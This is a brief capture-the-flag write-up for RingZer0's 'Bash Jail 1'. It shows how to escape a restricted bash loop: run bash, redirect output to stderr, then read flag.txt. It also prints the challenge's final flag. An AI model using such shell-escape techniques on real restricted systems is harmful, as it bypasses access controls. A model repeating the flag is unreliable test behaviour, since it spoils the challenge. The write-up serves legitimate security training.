# Bash Jail 1

## Challenge Details 

- **CTF:** RingZer0
- **Category:** Jail Escaping
- **Points:** 1

## Provided Materials

- SSH credentials

## Solution

Challenge bash code:

```sh
while :
do
	echo "Your input:"
	read input
	output=`$input`
done 
```

We can execute `bash` command to spawn a shell:

```sh
Your input:
bash
level1@jail-bash:~$
```

But when we execute commands, we don't see any output, so we need to redirect our `stdout` to `stderr`:

```sh
level1@jail-bash:~$ ls 1>&2
flag.txt  prompt.sh
```

And output `flag.txt`:

```sh
level1@jail-bash:~$ cat flag.txt 1>&2
FLAG-U96l4k6m72a051GgE5EN0rA85499172K
```

## Final Flag

`FLAG-U96l4k6m72a051GgE5EN0rA85499172K`

*Created by [bu19akov](https://github.com/bu19akov)*